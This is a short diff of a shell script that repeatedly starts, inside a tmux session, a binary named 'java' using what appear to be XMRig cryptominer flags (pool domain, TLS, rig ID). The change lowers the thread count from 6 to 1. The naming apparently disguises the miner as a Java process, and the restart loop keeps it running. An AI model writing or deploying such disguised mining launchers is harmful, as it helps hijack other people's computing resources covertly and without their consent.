@@ -42,7 +42,7 @@ while true; do
     echo "[+] run process - sleep 5 phút..."
     tmux new-session -s $SESSION -d
     tmux send-keys -t $SESSION "
-        $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
+        $(pwd)/java/java -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
     " C-m
 
     sleep 300
